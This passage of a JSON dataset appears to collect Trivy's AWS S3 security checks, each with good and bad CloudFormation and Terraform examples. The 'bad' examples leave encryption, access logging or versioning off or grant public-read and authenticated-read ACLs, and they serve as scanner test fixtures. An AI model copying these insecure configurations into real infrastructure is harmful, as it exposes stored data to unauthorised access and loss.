              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: true\n            ServerSideEncryptionByDefault:\n              SSEAlgorithm: AES256"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        kms_master_key_id = \"arn\"\n        sse_algorithm     = \"aws:kms\"\n      }\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      kms_master_key_id = aws_kms_key.mykey.arn\n      sse_algorithm     = \"aws:kms\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  rule {}\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            LoggingConfiguration:\n              DestinationBucketName: !Ref TestLoggingBucket\n              LogFilePrefix: accesslogs/\n\n        TestLoggingBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: LogDeliveryWrite\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n        logging {\n          target_bucket = aws_s3_bucket.log_bucket.id\n          target_prefix = \"log/\"\n        }\n      }\n\n      resource \"aws_s3_bucket\" \"log_bucket\" {\n        bucket = \"test-log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_bucket\" {\n        acl    = \"log-delivery-write\"\n        bucket = aws_s3_bucket.log_bucket.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n      }\n\n      resource \"aws_s3_bucket_logging\" \"this\" {\n        bucket        = aws_s3_bucket.this.id\n        target_bucket = aws_s3_bucket.log_bucket.id\n        target_prefix = \"log/\"\n      }\n\n      resource \"aws_s3_bucket\" \"log_bucket\" {\n        bucket = \"test-log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_bucket\" {\n        acl    = \"log-delivery-write\"\n        bucket = aws_s3_bucket.log_bucket.id\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_logging.yaml",
        "local_path": "aws/s3/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      LoggingConfiguration:\n        DestinationBucketName: !Ref TestLoggingBucket\n        LogFilePrefix: accesslogs/\n\n  TestLoggingBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: LogDeliveryWrite"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n  logging {\n    target_bucket = aws_s3_bucket.log_bucket.id\n    target_prefix = \"log/\"\n  }\n}\n\nresource \"aws_s3_bucket\" \"log_bucket\" {\n  bucket = \"test-log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_bucket\" {\n  acl    = \"log-delivery-write\"\n  bucket = aws_s3_bucket.log_bucket.id\n}",
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n}\n\nresource \"aws_s3_bucket_logging\" \"this\" {\n  bucket        = aws_s3_bucket.this.id\n  target_bucket = aws_s3_bucket.log_bucket.id\n  target_prefix = \"log/\"\n}\n\nresource \"aws_s3_bucket\" \"log_bucket\" {\n  bucket = \"test-log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_bucket\" {\n  acl    = \"log-delivery-write\"\n  bucket = aws_s3_bucket.log_bucket.id\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_OBJECT_READ_LOGGING",
        "title": "Enable Object Read Logging",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"ReadOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::test-bucket/\"] # another bucket\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::my-bucket\"] # missing slash\n          }\n        }\n      }\n",
        "file_name": "enable_object_read_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_object_read_logging.yaml",
        "local_path": "aws/s3/enable_object_read_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"ReadOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::test-bucket/\"] # another bucket\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::my-bucket\"] # missing slash\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_OBJECT_WRITE_LOGGING",
        "title": "Enable Object Write Logging",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"ReadOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::test-bucket/\"]\n          }\n        }\n      }\n",
        "file_name": "enable_object_write_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_object_write_logging.yaml",
        "local_path": "aws/s3/enable_object_write_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"ReadOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::test-bucket/\"]\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_VERSIONING",
        "title": "Enable Versioning",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            VersioningConfiguration:\n              Status: Enabled\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        versioning {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n        versioning_configuration {\n          status = \"Enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        versioning {\n          enabled = false\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n        versioning_configuration {\n          status = \"Disabled\"\n        }\n      }\n",
        "file_name": "enable_versioning.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_versioning.yaml",
        "local_path": "aws/s3/enable_versioning.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      VersioningConfiguration:\n        Status: Enabled"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  versioning {\n    enabled = true\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n  versioning_configuration {\n    status = \"Enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  versioning {\n    enabled = false\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n  versioning_configuration {\n    status = \"Disabled\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: true\n                  ServerSideEncryptionByDefault:\n                    KMSMasterKeyID: kms-arn\n                    SSEAlgorithm: aws:kms\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: false\n                  ServerSideEncryptionByDefault:\n                    SSEAlgorithm: AES256\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption\n  good:\n    - |-\n      resource \"aws_kms_key\" \"mykey\" {}\n\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            kms_master_key_id = aws_kms_key.mykey.arn\n            sse_algorithm     = \"aws:kms\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        # server access logging bucket\n        acl    = \"log-delivery-write\"\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n\n        # deprecated way\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              kms_master_key_id = aws_kms_key.example.arn\n              sse_algorithm     = \"aws:kms\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_acl\" {\n        bucket = aws_s3_bucket.good_example.id\n        access_control_policy {\n\n          grant {\n            grantee {\n              type = \"Group\"\n              uri  = \"http://acs.amazonaws.com/groups/s3/LogDelivery\"\n            }\n            permission = \"WRITE\"\n          }\n\n          owner {\n            id = data.aws_canonical_user_id.current.id\n          }\n        }\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"log-policy-bucket\"\n      }\n\n      resource \"aws_s3_bucket_policy\" \"log_policy\" {\n        bucket = aws_s3_bucket.good_example.id\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [{\n            Effect = \"Allow\"\n            Principal = {\n              Service = \"logging.s3.amazonaws.com\"\n            }\n            Action   = \"s3:PutObject\"\n            Resource = \"arn:aws:s3:::log-policy-bucket/logs/*\"\n          }]\n        })\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_exampl\" {\n        bucket = \"mybucket\"\n\n        # deprecated way\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              sse_algorithm = \"AES256\"\n            }\n          }\n        }\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/encryption_customer_key.yaml",
        "local_path": "aws/s3/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: true\n            ServerSideEncryptionByDefault:\n              KMSMasterKeyID: kms-arn\n              SSEAlgorithm: aws:kms"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: false\n            ServerSideEncryptionByDefault:\n              SSEAlgorithm: AES256"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption"
            ],
            "good": [
              "resource \"aws_kms_key\" \"mykey\" {}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      kms_master_key_id = aws_kms_key.mykey.arn\n      sse_algorithm     = \"aws:kms\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  # server access logging bucket\n  acl    = \"log-delivery-write\"\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n\n  # deprecated way\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        kms_master_key_id = aws_kms_key.example.arn\n        sse_algorithm     = \"aws:kms\"\n      }\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_acl\" {\n  bucket = aws_s3_bucket.good_example.id\n  access_control_policy {\n\n    grant {\n      grantee {\n        type = \"Group\"\n        uri  = \"http://acs.amazonaws.com/groups/s3/LogDelivery\"\n      }\n      permission = \"WRITE\"\n    }\n\n    owner {\n      id = data.aws_canonical_user_id.current.id\n    }\n  }\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"log-policy-bucket\"\n}\n\nresource \"aws_s3_bucket_policy\" \"log_policy\" {\n  bucket = aws_s3_bucket.good_example.id\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect = \"Allow\"\n      Principal = {\n        Service = \"logging.s3.amazonaws.com\"\n      }\n      Action   = \"s3:PutObject\"\n      Resource = \"arn:aws:s3:::log-policy-bucket/logs/*\"\n    }]\n  })\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_exampl\" {\n  bucket = \"mybucket\"\n\n  # deprecated way\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm = \"AES256\"\n      }\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-IGNORE_PUBLIC_ACLS",
        "title": "Ignore Public Acls",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            PublicAccessBlockConfiguration:\n              IgnorePublicAcls: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        ignore_public_acls = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        ignore_public_acls = false\n      }\n",
        "file_name": "ignore_public_acls.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/ignore_public_acls.yaml",
        "local_path": "aws/s3/ignore_public_acls.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      PublicAccessBlockConfiguration:\n        IgnorePublicAcls: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  ignore_public_acls = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}",
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  ignore_public_acls = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-NO_PUBLIC_ACCESS_WITH_ACL",
        "title": "No Public Access With Acl",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        acl = \"private\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n        acl    = \"private\"\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        acl = \"public-read\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n        acl    = \"authenticated-read\"\n      }\n",
        "file_name": "no_public_access_with_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/no_public_access_with_acl.yaml",
        "local_path": "aws/s3/no_public_access_with_acl.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket"
            ],
            "good": [
